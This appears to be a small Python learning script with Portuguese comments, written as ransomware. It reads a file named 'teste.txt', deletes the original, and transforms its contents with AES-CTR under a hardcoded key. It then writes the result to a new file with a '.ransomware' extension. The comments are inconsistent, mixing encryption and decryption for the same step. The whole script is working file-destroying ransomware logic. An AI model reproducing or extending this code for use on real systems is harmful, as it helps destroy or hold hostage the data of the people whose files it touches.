import os
import pyaes


## abrir o arquivo  criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

##remover o arquivo criptografado

os.remove(file_name)

## chave de descriptografia

key = b"vs_77_ransonware"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografando o arquivo
crypt_data = aes.decrypt(file_data)


## criar um novo arquivo criptografado

new_file = file_name + '.ransomware'
new_file = open(f'{new_file}','wb')
new_file.write(crypt_data)
new_file.close()